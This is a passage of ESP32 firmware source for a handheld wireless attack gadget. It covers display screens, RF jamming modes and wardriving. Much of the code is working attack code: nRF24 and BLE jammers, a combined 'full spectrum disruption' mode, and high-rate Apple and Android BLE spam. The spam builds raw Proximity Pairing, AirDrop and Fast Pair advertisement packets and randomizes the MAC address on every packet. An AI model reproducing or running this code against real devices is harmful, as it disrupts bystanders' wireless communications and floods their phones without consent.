  tft.println("ACTIVE!");
  
  y += 40;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  
  // Show current mode with details (COMPACT)
  switch (nrfJamMode) {
    case NRF_SWEEP:
      tft.println("SWEEP MODE");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(Smoochiee)");
      break;
    case NRF_RANDOM:
      tft.println("RANDOM MODE");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(Chaotic)");
      break;
    case NRF_FOCUSED:
      tft.println("FOCUSED MODE");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(BLE only)");
      break;
    case NRF_WIFI_CLOWN:
      tft.println("WIFI CLOWN V2");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_PURPLE);
      const char* wifi_ch_name = (wifi_jam_mode == 0) ? "Ch1" :
                                 (wifi_jam_mode == 1) ? "Ch6" : "Ch11";
      tft.printf("WiFi %s", wifi_ch_name);
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(Multi-sweep)");
      break;
  }
  
  y += 25;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Display frozen for");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("MAX PERFORMANCE");
  
  y += 20;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Check serial for");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("live statistics");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Mode: ");
  tft.setTextColor(dualNRFMode ? COLOR_GREEN : COLOR_CYAN);
  tft.println(dualNRFMode ? "DUAL" : "SINGLE");
  
  y += 12;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Radio 1: ");
  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
  tft.println(nrf1Available ? "OK" : "OFF");
  
  y += 12;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Radio 2: ");
  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_RED);
  tft.println(nrf2Available ? "OK" : "OFF");
  
  drawCenteredButton("[HOLD]", COLOR_RED);
}

void drawBLEJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble jammer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status display
  int y = HEADER_HEIGHT + 15;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Status: ");
  tft.setTextColor(COLOR_ORANGE);
  tft.println("JAMMING ACTIVE");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println(jammerModeText);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Packets sent: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Duration: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
  
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, y);
  tft.print("Flooding BLE spectrum with");
  
  y += 12;
  tft.setCursor(30, y);
  tft.print("random advertisements...");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void updateNRFJammerDisplay() {
  // This function is called in loop() for live updates
  // Only update the dynamic stats area to prevent flicker
  
  if (currentState != NRF_JAM_ACTIVE || !nrfJammerActive) return;
  
  int statsY = HEADER_HEIGHT + 85;  // Position of stats area
  int leftColX = SIDE_MARGIN;
  int rightColX = 130;
  
  // Clear ONLY the stats numbers area (not labels)
  tft.fillRect(leftColX, statsY + 12, 120, 15, COLOR_BG);
  tft.fillRect(rightColX, statsY + 12, 110, 15, COLOR_BG);
  
  // Update hop count
  tft.setTextColor(COLOR_ORANGE);
  tft.setTextSize(1);
  tft.setCursor(leftColX, statsY + 12);
  tft.printf("%-8d", nrfJamPackets);
  
  // Update hops per second
  static unsigned long lastHopCount = 0;
  static unsigned long lastHopTime = 0;
  static uint32_t hopsPerSec = 0;
  if (millis() - lastHopTime > 1000) {
    hopsPerSec = nrfJamPackets - lastHopCount;
    lastHopCount = nrfJamPackets;
    lastHopTime = millis();
  }
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(leftColX + 55, statsY + 12);
  tft.printf("(%d/s)", hopsPerSec);
  
  // Update duration
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(rightColX, statsY + 12);
  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
  tft.printf("%-3d sec", runtime);
  
  // Update performance indicator
  int perfY = statsY + 42;
  tft.fillRect(leftColX + 5, perfY, 230, 12, COLOR_BG);
  
  if (hopsPerSec > 50000) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("EXCELLENT (50k+)");
  } else if (hopsPerSec > 30000) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("VERY GOOD (30k+)");
  } else if (hopsPerSec > 15000) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("GOOD (15k+)");
  } else if (hopsPerSec > 5000) {
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("FAIR (5k+)");
  } else {
    tft.setTextColor(COLOR_RED);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("WEAK (<5k)");
  }
}

// ==================== Combined Jammer ====================

void startCombinedJammer() {
  Serial.println("\n========== COMBINED ATTACK MODE ==========");
  Serial.println("[+] Starting nRF24 jammer (PRIMARY)...");
  startNRFJammer();
  delay(100);
  
  Serial.println("[+] Starting BLE spam (SECONDARY)...");
  startBLEJammer();
  
  currentState = WIFI_BLE_NRF_JAM;
  
  addToConsole("COMBINED ATTACK ACTIVE");
  Serial.println("[!] FULL SPECTRUM DISRUPTION");
  Serial.println("    - nRF24: Jamming 2.4GHz (disconnects)");
  Serial.println("    - BLE: Spamming discovery");
  Serial.println("========================================\n");
  
  displayCombinedJammer();
}

void stopCombinedJammer() {
  Serial.println("\n[*] Stopping combined jammer...");
  stopNRFJammer();
  stopBLEJammer();
  
  currentState = BLE_MENU;
  drawBLEMenu();
}

void displayCombinedJammer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("combined jammer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 15;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("[!] FULL SPECTRUM JAMMING");
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // BLE section
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] BLE Jammer:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.print("Packets: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  y += 20;
  
  // nRF24 section
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] nRF24 Jammer:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.print("Packets: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", nrfJamPackets);
  
  y += 20;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Total
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Total packets: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", bleJamPackets + nrfJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.print("Jamming BLE + 2.4GHz RF");
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

// ==================== BLE Spam Functions ====================

void startAppleSpam() {
  if (appleSpamActive) return;
  
  Serial.println("\n[*] Starting Apple BLE Spam (AGGRESSIVE MODE)...");
  Serial.println("    Using raw ESP-IDF for maximum speed");
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24...");
    nrfJammerActive = false;
    delay(100);
  }
  if (bleJammerActive) stopBLEJammer();
  if (androidSpamActive) stopAndroidSpam();
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) pBLEScan->stop();
    delay(100);
  }
  
  // Force complete BLE shutdown
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // LOW-LEVEL BLE INIT (ESP-IDF)
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  // Set to NON-CONNECTABLE for spam
  esp_ble_gap_set_device_name("");
  
  appleSpamActive = true;
  appleSpamCount = 0;
  lastAppleSpam = 0;
  
  Serial.println("[+] Apple spam started (AGGRESSIVE)");
  Serial.println("    Flooding at maximum rate!");
  addToConsole("Apple spam: AGGRESSIVE");
}

void stopAppleSpam() {
  if (!appleSpamActive) return;
  
  appleSpamActive = false;
  Serial.println("\n[*] Stopping Apple spam...");
  
  // Stop advertising
  esp_ble_gap_stop_advertising();
  delay(100);
  
  // Shutdown BLE stack
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  
  delay(200);
  
  Serial.printf("[+] Stopped (%d sent)\n", appleSpamCount);
  addToConsole("Apple spam stopped");
}

void performAppleSpam() {
  if (!appleSpamActive) return;
  
  // AGGRESSIVE: 20ms cycle (50 packets/second per message type)
  if (millis() - lastAppleSpam < 20) return;
  lastAppleSpam = millis();
  
  static uint8_t msgRotation = 0;
  
  // Rotate through ALL message types rapidly
  msgRotation = (msgRotation + 1) % 15;
  
  uint8_t adv_data[31];
  uint8_t adv_len = 0;
  
  // BLE Flags
  adv_data[adv_len++] = 0x02;
  adv_data[adv_len++] = 0x01;
  adv_data[adv_len++] = 0x1A;  // LE General + No BR/EDR
  
  // Apple Company ID
  adv_data[adv_len++] = 0x1B;  // Length (will adjust)
  adv_data[adv_len++] = 0xFF;  // Manufacturer Specific
  adv_data[adv_len++] = 0x4C;  // Apple
  adv_data[adv_len++] = 0x00;
  
  if (msgRotation < 10) {
    // PROXIMITY PAIRING - All device types
    uint16_t model = apple_models[msgRotation % 10];
    
    adv_data[3] = 0x1B;  // Update length
    adv_data[adv_len++] = 0x07;  // Proximity Pairing
    adv_data[adv_len++] = 0x19;  // Length
    adv_data[adv_len++] = 0x01;  // Status
    adv_data[adv_len++] = (model >> 8) & 0xFF;
    adv_data[adv_len++] = model & 0xFF;
    adv_data[adv_len++] = 0x00;  // Status
    
    // Random MAC
    for (int i = 0; i < 6; i++) {
      adv_data[adv_len++] = random(0, 256);
    }
    
    adv_data[adv_len++] = 0x00;  // Hint
    
    // Reserved
    for (int i = 0; i < 8; i++) {
      adv_data[adv_len++] = 0x00;
    }
    
    // Battery (random)
    adv_data[adv_len++] = random(20, 100);
    adv_data[adv_len++] = random(20, 100);
    adv_data[adv_len++] = random(20, 100);
    
  } else if (msgRotation < 13) {
    // NEARBY ACTION - All action types
    uint8_t action = apple_actions[(msgRotation - 10) % 9];
    
    adv_data[3] = 0x08;  // Update length
    adv_data[adv_len++] = 0x0F;  // Nearby Action
    adv_data[adv_len++] = 0x05;  // Length
    adv_data[adv_len++] = 0x00;  // Flags
    adv_data[adv_len++] = action;
    
    // Auth tag
    for (int i = 0; i < 3; i++) {
      adv_data[adv_len++] = random(0, 256);
    }
    
  } else {
    // AIRDROP
    adv_data[3] = 0x15;  // Update length
    adv_data[adv_len++] = 0x05;  // AirDrop
    adv_data[adv_len++] = 0x12;  // Length
    adv_data[adv_len++] = 0x00;  // Flags
    
    // Zero hash
    for (int i = 0; i < 8; i++) {
      adv_data[adv_len++] = 0x00;
    }
    
    // Random data
    for (int i = 0; i < 9; i++) {
      adv_data[adv_len++] = random(0, 256);
    }
  }
  
  // CRITICAL: Set random MAC address for each packet
  uint8_t random_addr[6];
  for (int i = 0; i < 6; i++) {
    random_addr[i] = random(0, 256);
  }
  random_addr[0] |= 0xC0;  // Set random address type
  
  esp_ble_gap_set_rand_addr(random_addr);
  
  // Configure advertising parameters (fast)
  esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x20,        // 20ms
    .adv_int_max = 0x40,        // 40ms
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .peer_addr = {0},
    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };
  
  // Send the packet
  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
  esp_ble_gap_start_advertising(&adv_params);
  
  appleSpamCount++;
  
  // Quick stop for next packet (10ms later)
  delayMicroseconds(10000);
  esp_ble_gap_stop_advertising();
}

void startAndroidSpam() {
  if (androidSpamActive) return;
  
  Serial.println("\n[*] Starting Android BLE Spam (AGGRESSIVE MODE)...");
  Serial.println("    Using raw ESP-IDF for maximum speed");
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24...");
    nrfJammerActive = false;
    delay(100);
  }
  if (bleJammerActive) stopBLEJammer();
  if (appleSpamActive) stopAppleSpam();
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) pBLEScan->stop();
    delay(100);
  }
  
  // Force complete BLE shutdown
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // LOW-LEVEL BLE INIT (ESP-IDF)
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  esp_ble_gap_set_device_name("");
  
  androidSpamActive = true;
  androidSpamCount = 0;
  lastAndroidSpam = 0;
  
  Serial.println("[+] Android spam started (AGGRESSIVE)");
  Serial.println("    Flooding Fast Pair at maximum rate!");
  addToConsole("Android spam: AGGRESSIVE");
}

void stopAndroidSpam() {
  if (!androidSpamActive) return;
  
  androidSpamActive = false;
  Serial.println("\n[*] Stopping Android spam...");
  
  // Stop advertising
  esp_ble_gap_stop_advertising();
  delay(100);
  
  // Shutdown BLE stack
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  
  delay(200);
  
  Serial.printf("[+] Stopped (%d sent)\n", androidSpamCount);
  addToConsole("Android spam stopped");
}

void performAndroidSpam() {
  if (!androidSpamActive) return;
  
  // AGGRESSIVE: 20ms cycle (50 packets/second)
  if (millis() - lastAndroidSpam < 20) return;
  lastAndroidSpam = millis();
  
  // Rotate through models rapidly
  static uint8_t modelIndex = 0;
  modelIndex = (modelIndex + 1) % 13;
  
  uint32_t model = android_models[modelIndex];
  
  uint8_t adv_data[31];
  uint8_t adv_len = 0;
  
  // BLE Flags
  adv_data[adv_len++] = 0x02;
  adv_data[adv_len++] = 0x01;
  adv_data[adv_len++] = 0x1A;
  
  // Fast Pair Service UUID
  adv_data[adv_len++] = 0x03;
  adv_data[adv_len++] = 0x03;
  adv_data[adv_len++] = 0x2C;
  adv_data[adv_len++] = 0xFE;
  
  // Fast Pair Service Data
  adv_data[adv_len++] = 0x06;  // Length
  adv_data[adv_len++] = 0x16;  // Service Data
  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID
  adv_data[adv_len++] = 0xFE;
  
  // Model ID (3 bytes)
  adv_data[adv_len++] = (model >> 16) & 0xFF;
  adv_data[adv_len++] = (model >> 8) & 0xFF;
  adv_data[adv_len++] = model & 0xFF;
  
  // TX Power
  adv_data[adv_len++] = 0x02;
  adv_data[adv_len++] = 0x0A;
  adv_data[adv_len++] = 0x00;
  
  // Random MAC for each packet
  uint8_t random_addr[6];
  for (int i = 0; i < 6; i++) {
    random_addr[i] = random(0, 256);
  }
  random_addr[0] |= 0xC0;
  
  esp_ble_gap_set_rand_addr(random_addr);
  
  // Fast advertising parameters
  esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x20,        // 20ms
    .adv_int_max = 0x40,        // 40ms
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .peer_addr = {0},
    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };
  
  // Send packet
  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
  esp_ble_gap_start_advertising(&adv_params);
  
  androidSpamCount++;
  
  // Quick stop (10ms)
  delayMicroseconds(10000);
  esp_ble_gap_stop_advertising();
}

// ==================== AirTag Scanner ====================

void startAirTagScanner() {
  currentState = AIRTAG_SCANNER;
  airTagCount = 0;
  airtagScrollOffset = 0;
  
  addToConsole("AirTag scan started");
  
  // Initialize BLE
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  
  // Display results screen FIRST
  displayAirTagResults();
  
  // Start async scan
  pBLEScan->start(10, nullptr, false);
}

// ==================== COMBINED AGGRESSIVE SPAM ====================
void startCombinedSpam() {
  Serial.println("\n[*] Starting COMBINED SPAM (ULTRA AGGRESSIVE)...");
  Serial.println("    Apple + Android flooding simultaneously!");
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24...");
    nrfJammerActive = false;
    delay(100);
  }
  if (bleJammerActive) stopBLEJammer();
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) pBLEScan->stop();
    delay(100);
  }
  
  // Force complete BLE shutdown
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // LOW-LEVEL BLE INIT
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  esp_ble_gap_set_device_name("");
  
  appleSpamActive = true;
  androidSpamActive = true;
  appleSpamCount = 0;
  androidSpamCount = 0;
  lastAppleSpam = 0;
  lastAndroidSpam = 0;
  
  Serial.println("[+] COMBINED SPAM ACTIVE!");
  Serial.println("    Alternating Apple/Android at 100 pkt/sec");
  addToConsole("COMBINED: ULTRA AGGRESSIVE");
}

void performCombinedSpam() {
  if (!appleSpamActive && !androidSpamActive) return;
  
  // ULTRA AGGRESSIVE: 10ms alternating
  static unsigned long lastSpam = 0;
  static bool doApple = true;
  
  if (millis() - lastSpam < 10) return;
  lastSpam = millis();
  
  // Alternate between Apple and Android
  if (doApple) {
    performAppleSpam();
  } else {
    performAndroidSpam();
  }
  
  doApple = !doApple;
}

void displayAirTagResults() {
  currentState = AIRTAG_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("airtag scan");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(airTagCount > 0 ? COLOR_ORANGE : COLOR_GREEN);
  tft.printf("%d", airTagCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("ADDRESS");
  tft.setCursor(110, listY);
  tft.print("RSSI");
  tft.setCursor(150, listY);
  tft.print("SEEN");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  if (airTagCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("No AirTags detected yet...");
  } else {
    // Pagination
    const int MAX_AIRTAG_DISPLAY = 9;
    
    if (airtagScrollOffset >= airTagCount) {
      airtagScrollOffset = max(0, airTagCount - MAX_AIRTAG_DISPLAY);
    }
    
    int displayCount = min(airTagCount - airtagScrollOffset, MAX_AIRTAG_DISPLAY);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = airtagScrollOffset + i;
      int y = listY + (i * 26);
      
      // Warning indicator
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print("[!]");
      
      // Address (shortened)
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 20, y + 2);
      String addr = airTags[idx].address;
      if (addr.length() > 12) addr = addr.substring(0, 12);
      tft.print(addr);
      
      // RSSI
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(110, y + 2);
      tft.printf("%d", airTags[idx].rssi);
      
      // Detection count
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(150, y + 2);
      tft.printf("%dx", airTags[idx].detectionCount);
      
      // Full address on second line
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 20, y + 12);
      tft.print(airTags[idx].address);
    }
    
    // Scroll indicator
    if (airTagCount > MAX_AIRTAG_DISPLAY) {
      int scrollY = listY + (MAX_AIRTAG_DISPLAY * 26) + 5;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      
      char scrollText[20];
      sprintf(scrollText, "[%d-%d/%d]", 
              airtagScrollOffset + 1, 
              airtagScrollOffset + displayCount, 
              airTagCount);
      int textWidth = strlen(scrollText) * 6;
      int centerX = (240 - textWidth) / 2;
      
      tft.setCursor(centerX, scrollY);
      tft.print(scrollText);
    }
  }
    drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== Skimmer Detector ====================

void startSkimmerDetector() {
  currentState = SKIMMER_DETECTOR;
  skimmerCount = 0;
  
  addToConsole("Skimmer scan started");
  
  // Initialize BLE
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  
  // Display results screen FIRST
  displaySkimmerResults();
  
  // Start async scan
  pBLEScan->start(8, nullptr, false);
}


void displaySkimmerResults() {
  currentState = SKIMMER_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("skimmer scan");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(skimmerCount > 0 ? COLOR_RED : COLOR_GREEN);
  tft.printf("%d", skimmerCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("DEVICE");
  tft.setCursor(140, listY);
  tft.print("RSSI");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  if (skimmerCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("All clear - no skimmers");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 55);
    tft.print("detected nearby");
  } else {
    // Pagination
    const int MAX_SKIMMER_DISPLAY = 9;
    
    if (skimmerScrollOffset >= skimmerCount) {
      skimmerScrollOffset = max(0, skimmerCount - MAX_SKIMMER_DISPLAY);
    }
    
    int displayCount = min(skimmerCount - skimmerScrollOffset, MAX_SKIMMER_DISPLAY);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = skimmerScrollOffset + i;
      int y = listY + (i * 26);
      
      // Warning indicator
      tft.setTextColor(COLOR_RED);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print("[!]");
      
      // Device name
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 20, y + 2);
      String name = skimmers[idx].name;
      if (name.length() > 15) name = name.substring(0, 14) + "~";
      tft.print(name);
      
      // RSSI
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(140, y + 2);
      tft.printf("%d", skimmers[idx].rssi);
      
      // Warning
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 20, y + 12);
      tft.print("Very close!");
    }
    
    // Scroll indicator
    if (skimmerCount > MAX_SKIMMER_DISPLAY) {
      int scrollY = listY + (MAX_SKIMMER_DISPLAY * 26) + 5;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      tft.setCursor(85, scrollY);
      tft.printf("[%d-%d/%d]", 
                 skimmerScrollOffset + 1, 
                 skimmerScrollOffset + displayCount, 
                 skimmerCount);
    }
  }
  
    drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== Wardriving ====================

void startWardriving() {
  currentState = WARDRIVING_MODE;
  
  // Reset stats
  wardrivingStats.totalAPs = 0;
  wardrivingStats.openAPs = 0;
  wardrivingStats.securedAPs = 0;
  wardrivingStats.strongestSSID = "";
  wardrivingStats.strongestRSSI = -100;
  
  addToConsole("Wardriving started");
  
  // Display results screen FIRST
  displayWardrivingResults();
  
  // Start async WiFi scan
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  WiFi.scanNetworks(true);
}

void displayWardrivingResults() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wardriving");
  esp_task_wdt_reset();

  // Heap monitoring
  static unsigned long lastHeapCheck = 0;
  if (millis() - lastHeapCheck > 10000) {
    if (ESP.getFreeHeap() < 20000) {
      addToConsole("WARN: Low memory!");
      Serial.printf("⚠️  Free heap: %d bytes\n", ESP.getFreeHeap());
    }
    lastHeapCheck = millis();
  }
  
  static unsigned long lastBlink = 0;
  static bool blink = false;
  if (millis() - lastBlink > 500) {
    blink = !blink;
    lastBlink = millis();
  }
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 15;
  
  // Check if scan is complete
  int scanStatus = WiFi.scanComplete();
  
  if (scanStatus == WIFI_SCAN_RUNNING || scanStatus == WIFI_SCAN_FAILED) {
    // Still scanning
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Scanning networks...");
    
    y += 20;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("This may take a few seconds");
  } else {
    // Scan complete - process results
    if (scanStatus > 0 && wardrivingStats.totalAPs == 0) {
      wardrivingStats.totalAPs = scanStatus;
      
      for (int i = 0; i < scanStatus; i++) {
        if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
          wardrivingStats.openAPs++;
        } else {
          wardrivingStats.securedAPs++;
        }
        
        int rssi = WiFi.RSSI(i);
        if (rssi > wardrivingStats.strongestRSSI) {
          wardrivingStats.strongestRSSI = rssi;
          wardrivingStats.strongestSSID = WiFi.SSID(i);
        }
      }
    }
    
    // Display stats (clean terminal style - no backgrounds)
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("[*] Total APs: ");
    tft.setTextColor(COLOR_CYAN);
